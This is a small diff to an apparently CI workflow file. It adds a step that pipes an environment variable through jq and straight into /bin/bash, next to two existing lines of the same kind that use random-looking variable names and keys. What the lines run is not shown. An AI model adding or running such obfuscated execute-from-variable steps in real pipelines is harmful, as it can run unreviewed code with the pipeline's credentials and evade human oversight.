@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$cfus928" | jq -r .x8330 | /bin/bash
           printf '%s' "$ldtx0" | jq -r .cew29 | /bin/bash
+          echo $ks7576 | jq -r .waxh48 | /bin/bash
 
       - name: Save results
         if: always()
